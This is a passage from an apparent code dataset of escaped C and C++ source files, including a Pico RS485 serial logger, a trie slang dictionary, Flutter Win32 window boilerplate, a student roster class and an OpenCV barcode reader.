Tente de novo.\" << endl;\n                return 0;\n            }\n            \n        }\n    }\n    else if (toLowerCase(response) == \"n\")\n    {\n        return 0;\n    }\n    else\n    {\n        cout << \"[ERROR] A resposta esta incorreta. Tente de novo.\" << endl;\n        return 0;\n    }\n}\n",
    "#include <stdio.h>\n#include \"pico/stdlib.h\"\n#include <hardware/gpio.h>\n#include <hardware/uart.h>\n#include \"crc.h\"\n\n#define RS485_RX_PIN  21\n#define RS485_TX_PIN  20\n\nvolatile bool ledState = true;\n\nint main() {\n    stdio_init_all();\n\n    gpio_init(PICO_DEFAULT_LED_PIN);\n    gpio_set_dir(PICO_DEFAULT_LED_PIN, GPIO_OUT);\n    gpio_put(PICO_DEFAULT_LED_PIN, 1);\n\n    uart_init(uart1, 38400);\n    gpio_set_function(RS485_RX_PIN, GPIO_FUNC_UART);\n    gpio_set_function(RS485_TX_PIN, GPIO_FUNC_UART);\n\n    \n\n    while (true) {\n        // Wait for a null bute\n        uint8_t byte;\n        do { uart_read_blocking(uart1, &byte, 1); }\n        while (byte);\n\n        gpio_put(PICO_DEFAULT_LED_PIN, 0);\n        uint64_t timestamp = time_us_64();\n\n        // Read the destination\n        uint8_t dest;\n        uart_read_blocking(uart1, &dest, 1);\n\n        // Print header\n        uint32_t us = timestamp % 1000000;\n        uint32_t s = timestamp / (uint64_t)1000000;\n        uint32_t m = s / 60;\n        uint32_t h = m / 60;\n        printf(\"%c %02d:%02d:%02d.%06d \", (dest == 0x05)?'>':'<', h%24, m%60, s%60, us);\n        \n        // Read 0x7E\n        uart_read_blocking(uart1, &byte, 1);\n        //printf(\"7E \");\n\n        // Read data until next 0x7E\n        while (true) {\n            uart_read_blocking(uart1, &byte, 1);\n            if (byte == 0x7E) { break; }\n            printf(\"%02X\", byte);\n        }\n        //printf(\"7E \");\n        printf(\"\\n\");\n\n        gpio_put(PICO_DEFAULT_LED_PIN, 1);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdbool.h>\n\n#define CHAR_SIZE 256\nint count = 1;\nchar word[101];\n\nstruct trieNode{\n\tstruct trieNode *children[CHAR_SIZE];\n\tbool isEndOfWorld;\n\tchar desc[100];\n};\n\nstruct trieNode *createNode(){\n\tstruct trieNode *node = (struct trieNode*)malloc(sizeof(struct trieNode));\n\t\n\tif(node){\n\t\tnode->isEndOfWorld = false;\n\t\t\n\t\tfor(int i = 0; i < CHAR_SIZE; i++){\n\t\t\tnode->children[i] = NULL;\n\t\t}\n\t}\n\t\n\treturn node;\n}\n\nvoid insert(struct trieNode *root, char *key){\n\tstruct trieNode *current = root;\n\t\n\tint length = strlen(key);\n\t\n\tfor(int i = 0; i < length; i++){\n\t\tint index = key[i] - 'A';\n\t\t\n\t\tif(!current->children[index]){\n\t\t\tcurrent->children[index] = createNode();\n\t\t}\n\t\t\n\t\tcurrent = current->children[index];\n\t}\n\t\n\tcurrent->isEndOfWorld = true;\n}\n\nbool search(struct trieNode *root, char *key){\n\tstruct trieNode *current = root;\n\tint length = strlen(key);\n\t\n\tfor(int i = 0; i < length; i++){\n\t\tint index = key[i] - 'A';\n\t\t\n\t\tif(!current->children[index]){\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tcurrent = current->children[index];\n\t}\n\t\n\treturn (current != NULL && current->isEndOfWorld);\n}\n\nvoid printTrie(struct trieNode *root, char *buffer, int depth){\n\tbool hasWords = false;\n\t\n\tif(root->isEndOfWorld){\n\t\thasWords = true;\n\t\t\n\t\tif(count == 1){\n\t\t\tprintf(\"List of all slang words in the dictionary:\\n\");\n\t\t}\n\t\t\n\t\tbuffer[depth] = '\\0';\n\t\tprintf(\"%d. %s\\n\",count, buffer);\n\t\tcount++;\n\t}\n\t\n\tfor(int i = 0; i < CHAR_SIZE; i++){\n\t\tif(root->children[i] != NULL){\n\t\t\tbuffer[depth] = i + 'A';\n\t\t\tprintTrie(root->children[i], buffer, depth + 1);\n\t\t\thasWords = true;\n\t\t}\n\t}\n\t\n\tif(!hasWords){\n\t\tprintf(\"There is no slang words yet in the dictionary.\\n\");\n\t}\n}\n\nvoid printTrieWithPrefix(struct trieNode *root, char *prefix, char *buffer, int depth){\n\tbool hasWords = false;\n\t\n\tif(root->isEndOfWorld){\n\t\thasWords = true;\n\t\t\n\t\tif(count == 1){\n\t\t\tprintf(\"List of all slang words in the dictionary:\\n\");\n\t\t}\n\t\t\n\t\tbuffer[depth] = '\\0';\n\t\tprintf(\"%d. %s%s\\n\",count, prefix, buffer);\n\t\tcount++;\n\t}\n\t\n\tfor(int i = 0; i < CHAR_SIZE; i++){\n\t\tif(root->children[i] != NULL){\n\t\t\tbuffer[depth] = i + 'A';\n\t\t\tprintTrieWithPrefix(root->children[i], prefix, buffer, depth + 1);\n\t\t\thasWords = true;\n\t\t}\n\t}\n\t\n\tif(!hasWords){\n\t\tprintf(\"There is no prefix \\\"%s\\\" in the dictionary.\\n\", prefix);\n\t}\n}\n\nvoid searchPrefix(struct trieNode *root, char *prefix){\n\tstruct trieNode *current = root;\n\tint length = strlen(prefix);\n\tchar buffer[100];\n\t\n\tfor(int i = 0; i < length; i++){\n\t\tint index = prefix[i] - 'A';\n\t\t\n\t\tif(current->children[index] == NULL){\n\t\t\tprintf(\"There is no prefix \\\"%s\\\" in the dictionary.\\n\", prefix);\n\t\t\treturn;\n\t\t}\n\t\tcurrent = current->children[index];\n\t}\n\t\n\tprintf(\"Words starting with \\\"%s\\\": \\n\", prefix);\n\tprintTrieWithPrefix(current, prefix, buffer, 0);\n}\n\nvoid menu(){\n\tsystem(\"cls\");\n\tputs(\"1. Release a new slang word\");\n\tputs(\"2. Search a slang word\");\n\tputs(\"3. View all slang words starting with a certain prefix word\");\n\tputs(\"4. View all slang words\");\n\tputs(\"5. Exit\");\n\tprintf(\">> \");\n}\n\nint main(){\n\tstruct trieNode *root = createNode();\n\t\n\tint choice;\n\tchar desc[100], searchWord[100], searchPrefix1[100];\n\t\n\twhile(true){\n\t\tmenu();\n\t\tscanf(\"%d\", &choice);\n\t\t\n\t\tswitch(choice){\n\t\t\tcase 1:{\n\t\t\t\tdo{\n\t\t\t\t\tprintf(\"Input a new slang word [Must be more than 1 characters and contains no space]: \");\n\t\t\t\t\tscanf(\"%s\", word); getchar();\n\t\t\t\t\t\n\t\t\t\t\tif(search(root, word)){\n\t\t\t\t\t\tprintf(\"Input a new slang word description [Must be more than 2 words]: \");\n\t\t\t\t\t\tscanf(\"%s\", desc); getchar();\n\t\t\t\t\t\tinsert(root, desc);\n\t\t\t\t\t}\t\n\t\t\t\t\t\n\t\t\t\t} while(strlen(word) <= 1 && strchr(word, ' ') == 0);\n\t\t\t\t\n\t\t\t\tinsert(root, word);\n\t\t\t\t\n\t\t\t\tprintf(\"Succesfully released new slang word.\\n\");\n\t\t\t\tsystem(\"pause\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tcase 2:{\n\t\t\t\tprintf(\"Input a slang word to be searched [Must be more than 1 characters and contains no space]: \");\n\t\t\t\tscanf(\"%s\", searchWord); getchar();\n\t\t\t\t\n\t\t\t\tif(!search(root, searchWord)){\n\t\t\t\t\tprintf(\"There is no word '%s' in the dictionary.\\n\", searchWord);\n\t\t\t\t} else {\n\t\t\t\t\tprintf(\"Slang word: %s\\n\", searchWord);\n\t\t\t\t\tprintf(\"Description: %s\\n\", desc);\n\t\t\t\t}\n\t\t\t\tsystem(\"pause\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tcase 3:{\n\t\t\t\tprintf(\"Input a prefix to be searched: \");\n\t\t\t\tscanf(\"%s\", searchPrefix1); getchar();\n\t\t\t\t\n\t\t\t\tsearchPrefix(root, searchPrefix1);\n\t\t\t\tsystem(\"pause\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tcase 4:{\n\t\t\t\tcount = 1;\n\t\t\t\tchar buffer[100];\n\t\t\t\tprintTrie(root, word, 0);\n\t\t\t\tsystem(\"pause\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tcase 5:{\n\t\t\t\tprintf(\"Thank you... Have a nice day :)\\n\");\n\t\t\t\treturn 0;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t\n\treturn 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\r\n#include <iomanip>\r\n#include <stack>\r\n#include <string>\r\nusing namespace std;\r\n\r\n// Function used to check if the parentheses in the expression are balanced or not\r\nbool balancedParentheses(string expr)\r\n{\r\n    // Stack of characters named p because the expression will contain parentheses\r\n    stack<char> p;\r\n    // for loop used in order to traverse the expression of parentheses\r\n    for (int i = 0; i < expr.length(); i++)\r\n    {\r\n        // If the expression contains open parentheses, meaning '('\r\n        if (expr[i] == '(')\r\n            p.push(expr[i]);\r\n        else\r\n            p.pop();\r\n    }\r\n    // Return empty stack\r\n    return (p.empty());\r\n}\r\n\r\n// main function, which will take the input from the user and display the output\r\n// of whether or not the expression contains balanced parentheses\r\nint main()\r\n{\r\n    string parenthesesExpression;\r\n    // The user inputting the parentheses expression that either does or does not have balanced parentheses.\r\n    cin >> parenthesesExpression;\r\n    if (balancedParentheses(parenthesesExpression))\r\n        // Output that will be displayed if the expression has balanced parentheses.\r\n        cout << \"Balanced\";\r\n    else\r\n        // Output that will be displayed if the expression's parentheses are not balanced.\r\n        cout << \"Not Balanced\";\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nvector<vector<int>> generateSpiralMatrix(int n) {\r\n    vector<vector<int>> matrix(n, vector<int>(n, 0));\r\n    int top = 0, bottom = n - 1, left = 0, right = n - 1;\r\n    int num = 1;\r\n\r\n    while (top <= bottom && left <= right) {\r\n        for (int i = left; i <= right; ++i)\r\n            matrix[top][i] = num++;\r\n        ++top;\r\n\r\n        for (int i = top; i <= bottom; ++i)\r\n            matrix[i][right] = num++;\r\n        --right;\r\n\r\n        for (int i = right; i >= left; --i)\r\n            matrix[bottom][i] = num++;\r\n        --bottom;\r\n\r\n        for (int i = bottom; i >= top; --i)\r\n            matrix[i][left] = num++;\r\n        ++left;\r\n    }\r\n\r\n    return matrix;\r\n}\r\n\r\nint main() {\r\n    int n = 3;\r\n    vector<vector<int>> spiralMatrix = generateSpiralMatrix(n);\r\n\r\n    cout << \"[\";\r\n    for (int i = 0; i < n; ++i) {\r\n        cout << \"[\";\r\n        for (int j = 0; j < n; ++j) {\r\n            cout << spiralMatrix[i][j];\r\n            if (j != n - 1) cout << \",\";\r\n        }\r\n        cout << \"]\";\r\n        if (i != n - 1) cout << \",\";\r\n    }\r\n    cout << \"]\" << endl;\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"gui.h\"\nvoid gui::on_output_view_select_None_button_clicked(){\n  //std::cout<<\"Non \"<<std::endl;\n  msg->output_view_source.write(0);\n  \n}\n\nvoid gui::on_output_view_select_video_button_clicked(){\n  //std::cout<<\"video \"<<std::endl;\n  msg->output_view_source.write(1);\n\n}\n\nvoid gui::on_output_view_select_detect_button_clicked(){\n  //std::cout<<\"Detect \"<<std::endl;\n  msg->output_view_source.write(2);\n}\n\nvoid gui::on_output_view_select_disp_button_clicked(){\n  //std::cout<<\"Disp \"<<std::endl;\n  msg->output_view_source.write(3);\n}\n\nvoid gui::on_output_view_select_3D_button_clicked(){\n  //std::cout<<\"3D \"<<std::endl;\n  msg->output_view_source.write(4);\n}\n\n\nvoid gui::on_browse_button_clicked(){\n\n  Gtk::FileChooserDialog dialog(\"Please choose a file\",\n  Gtk::FILE_CHOOSER_ACTION_OPEN);\n  dialog.set_transient_for(*this);\n\n  dialog.add_button(\"_Cancel\", Gtk::RESPONSE_CANCEL);\n  dialog.add_button(\"_Open\", Gtk::RESPONSE_OK);\n\n  auto filter_mp4= Gtk::FileFilter::create();\n  filter_mp4->set_name(\".mp4\");\n  filter_mp4->add_pattern(\"*.mp4\");\n  dialog.add_filter(filter_mp4);\n\n  int result = dialog.run();\n  //Handle the response:\n  switch(result)\n  {\n    case(Gtk::RESPONSE_OK):\n    {\n      std::cout << \"Open clicked.\" << std::endl;\n      //Notice that this is a std::string, not a Glib::ustring.\n      std::string filename = dialog.get_filename();\n      //std::cout << \"File selected: \" <<  filename << std::endl;\n      msg->input_file_name.write(filename);\n      break;\n    }\n    case(Gtk::RESPONSE_CANCEL):\n    {\n      //std::cout << \"Cancel clicked.\" << std::endl;\n      break;\n    }\n    default:\n    {\n      //std::cout << \"Unexpected button clicked.\" << std::endl;\n      break;\n    }\n  }\n\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <sstream>\r\n#include \"roster.h\"\r\n#include \"student.h\"\r\nusing std::string;\r\n\r\nRoster::Roster(const string students[]) {\r\n\r\n    int arrSize{sizeof(*students) / sizeof(students)}; // Calculates number of elements in students\r\n\r\n    for (size_t i{0}; i < arrSize; i++) {\r\n        string student{students[i]}; // All info for one student\r\n\r\n        // Store student information separated by comma into array of strings\r\n        string student_info[6 + 3]; // 7 attributes, one is an array of 3 elements\r\n        std::stringstream s_student(student);\r\n        int info_i{0};\r\n        while (s_student.good()) {\r\n            string substr;\r\n            getline(s_student, substr, ',');\r\n            student_info[info_i] = substr;\r\n            info_i++;\r\n        }\r\n\r\n        // String values, direct initialization\r\n        string student_id{student_info[0]};\r\n        string student_first{student_info[1]};\r\n        string student_last{student_info[2]};\r\n        string student_email{student_info[3]};\r\n\r\n        // Int values, must convert string to int\r\n        int student_age{std::stoi(student_info[4], nullptr, 0)};\r\n        int student_days[3]{\r\n            std::stoi(student_info[5], nullptr, 0),\r\n            std::stoi(student_info[6], nullptr, 0),\r\n            std::stoi(student_info[7], nullptr, 0)\r\n        };\r\n\r\n        // DegreeProgram value, must assign based on string input\r\n        string chosen_program{student_info[8]};\r\n        DegreeProgram student_program{};\r\n        if (chosen_program == \"SECURITY\")\r\n            student_program = DegreeProgram::SECURITY;\r\n        else if (chosen_program == \"NETWORK\")\r\n            student_program = DegreeProgram::NETWORK;\r\n        else if (chosen_program == \"SOFTWARE\")\r\n            student_program = DegreeProgram::SOFTWARE;\r\n        else\r\n            throw std::invalid_argument(\"Degree Program isn't valid.\");\r\n\r\n        // Create Student object\r\n        *(classRosterArray + i) = new Student {\r\n            student_id,\r\n            student_first,\r\n            student_last,\r\n            student_email,\r\n            student_age,\r\n            student_days,\r\n            student_program\r\n        };\r\n    }\r\n}\r\n\r\nint Roster::maxStudents() { // Returns the max number of students\r\n    return sizeof(classRosterArray) / sizeof(*classRosterArray);\r\n}\r\n\r\nint Roster::studentIndexById(string studentID) {\r\n    int found{-1};\r\n    for (int i{0}; i < firstEmptySpot(); i++) {\r\n        Student* current_student = classRosterArray[i];\r\n        if (current_student->getId() == studentID) {\r\n            found = i;\r\n            break;\r\n        }\r\n    }\r\n    return found;\r\n}\r\n\r\nsize_t Roster::firstEmptySpot() {\r\n    size_t empty_index{};\r\n    int arrSize{maxStudents()}; // Max number of students\r\n    for (int i{0}; i < arrSize; i++)\r\n        if (i == (arrSize - 1)) {\r\n            empty_index = arrSize;\r\n        }\r\n        else if (classRosterArray[i] == NULL) {\r\n            empty_index = i;\r\n            break;\r\n        }\r\n    return empty_index;\r\n}\r\n\r\nvoid Roster::add(string studentID, string firstName, string lastName, string emailAddress, int age, int daysInCourse1, int daysInCourse2, int daysInCourse3, DegreeProgram degreeprogram) {\r\n    // Convert daysInCourse# to array\r\n    int daysInCourses[]{\r\n        daysInCourse1,\r\n        daysInCourse2,\r\n        daysInCourse3\r\n    };\r\n\r\n    // Find empty spot on roster array\r\n    size_t empty_index{firstEmptySpot()};\r\n\r\n    // Add to roster\r\n    *(classRosterArray + empty_index) = new Student{\r\n        studentID,\r\n        firstName,\r\n        lastName,\r\n        emailAddress,\r\n        age,\r\n        daysInCourses,\r\n        degreeprogram\r\n    };\r\n}\r\n\r\nvoid Roster::remove(string studentID) {\r\n    int arrSize{maxStudents()}; // Max number of students\r\n    \r\n    // Find index of student with id\r\n    int found{studentIndexById(studentID)};\r\n    if (found == -1) {\r\n        std::cout << std::endl << \"Could not find student ID \\\"\" << studentID << \"\\\" in roster.\" << std::endl;\r\n    }\r\n    // Delete student\r\n    else {\r\n        delete classRosterArray[found];\r\n\r\n        // Move remaining students down on array\r\n        for (int i{found}; i < (arrSize - 1); i++) {\r\n            classRosterArray[i] = classRosterArray[i + 1];\r\n        }\r\n        Student* new_last[1] {}; // Workaround to duplicate behavior of initial student pointer array\r\n        classRosterArray[arrSize - 1] = new_last[0];\r\n    }\r\n}\r\n\r\nvoid Roster::printAll() {\r\n    size_t empty_index{firstEmptySpot()};\r\n    for (size_t i{0}; i < empty_index; i++) {\r\n        Student* current_student = classRosterArray[i];\r\n        current_student->print();\r\n    }\r\n    std::cout << std::endl;\r\n}\r\n\r\nvoid Roster::printAverageDaysInCourse(string studentID) {\r\n    // Point to desired student\r\n    Student* current_student{classRosterArray[studentIndexById(studentID)]};\r\n\r\n    // Calculate average\r\n    int sumDays{current_student->getCompletionDay(1) + current_student->getCompletionDay(2) + cu",
    "// Track_Detector.cpp : This file contains the 'main' function. Program execution begins and ends there.\r\n//\r\n#include <iostream>\r\n#include <vector>\r\n#include <opencv2/opencv.hpp>\r\n#include <opencv2/core/core.hpp>\r\n#include <opencv2/highgui/highgui.hpp>\r\n#include <opencv2/imgproc.hpp>\r\n#include <string>\r\n#include <sstream>\r\n\r\nusing namespace std;\r\nusing namespace cv;\r\nconst char* image_window = \"Source Image\";\r\n//const char* result_window = \"Result window\";\r\nint font_size = 1;\r\nScalar font_color(0, 0, 0);\r\nint font_weight = 2;\r\n\r\nvoid save(Mat image,string path) {\r\n    bool isSuccess = imwrite(path, image);\r\n    if (isSuccess == false) {\r\n        cout << \"Failed to save image\" << endl;\r\n        cin.get();\r\n    }\r\n    else {\r\n        cout << \"Image saved\" << endl;\r\n    }\r\n}\r\n\r\nint** TemplateMatching(Mat source, Mat templ, int objectNum) {\r\n    int** arr = new int* [objectNum];\r\n    Mat result;\r\n    double minVal;\r\n    double maxVal;\r\n    Point minLoc;\r\n    Point matchLoc;\r\n    Point maxLoc;\r\n    int j = 0;\r\n    for (int k = 0; k < objectNum; k++, j++) {\r\n        matchTemplate(source, templ, result, TM_SQDIFF_NORMED);\r\n        minMaxLoc(result, &minVal, &maxVal, &minLoc, &maxLoc, Mat());\r\n        matchLoc = minLoc;\r\n        arr[k] = new int[objectNum];\r\n        arr[k][0] = matchLoc.x;\r\n        arr[k][1] = matchLoc.y;\r\n        for (int i = 0; i < templ.cols; i++) {\r\n            for (int j = 0; j < templ.rows; j++) {\r\n                source.at<Vec2b>(matchLoc.y + j, (matchLoc.x + i) / 2) = 0;\r\n            }\r\n        }\r\n    }\r\n    return arr;\r\n}\r\n\r\nint Table(int binary) {\r\n    switch (binary) {\r\n    case(21100001):\r\n        return 1;\r\n        break;\r\n    case(21010010):\r\n        return 2;\r\n        break;\r\n    case(10110011):\r\n        return 3;\r\n        break;\r\n    case(20110100):\r\n        return 4;\r\n        break;\r\n    case(11010101):\r\n        return 5;\r\n        break;\r\n    case(11100110):\r\n        return 6;\r\n        break;\r\n    case(20000111):\r\n        return 7;\r\n        break;\r\n    case(11111000):\r\n        return 8;\r\n        break;\r\n    case(20011001):\r\n        return 9;\r\n        break;\r\n    case(20101010):\r\n        return 0;\r\n        break;\r\n    default:\r\n        return 0;\r\n        break;\r\n    }\r\n}\r\n\r\nvoid Barcode(Mat source, int x, int y, Mat templ) {\r\n    int barcode[80];\r\n    memset(barcode, 0, sizeof(barcode));\r\n    int textNum[10];\r\n    memset(textNum, 0, sizeof(textNum));\r\n    int adjust;\r\n    std::ostringstream oss;\r\n    for (int N = 0; N < 2; N++) {\r\n        int test = 0;\r\n        int index = 0;\r\n        int count = 0;\r\n        int width = 29;\r\n        int norm = 12;\r\n        int threshold = 100;\r\n        while (index != 100) {\r\n            test = int(source.at<Vec2b>(y + index, x / 2 + 66 - N * 44)[0]);\r\n            if (test < threshold - 10 && test > 50) {\r\n                count += 1;\r\n            } //makes sure its a barcode value and not random black dot\r\n            if (count > 2 && test > threshold - 20) {  //found barcode\r\n                for (int i = 0; i < 40; i++) {//barcode sections\r\n                    for (int n = 0; n < 29; n++) {//each section value\r\n                        barcode[i + N * 40] += source.at<Vec2b>(y + index - count / 2 - norm + i * 29 + n, x / 2 + 66 - N * 44)[0];\r\n                    }//total value of each section\r\n                    if (barcode[i + N * 40] / width > threshold) {\r\n                        barcode[i + N * 40] = 0;\r\n                    }\r\n                    else {\r\n                        barcode[i + N * 40] = 1;\r\n                    }\r\n                }\r\n                index = 100;\r\n            }\r\n            else {\r\n                index += 1;\r\n            }\r\n        }\r\n    }\r\n    for (int i = 0; i < 10; i++) {\r\n        for (int j = 0; j < 8; j++) {\r\n            if (j == 0) {\r\n                adjust = 1;\r\n            }\r\n            else {\r\n                adjust = 0;\r\n            }\r\n            textNum[i] += (barcode[i * 8 + j] + adjust) * pow(10, 7 - j);\r\n        }\r\n        textNum[i] = Table(textNum[i]);\r\n    }\r\n    oss << \"Photo: \" << textNum[1] << textNum[2] << 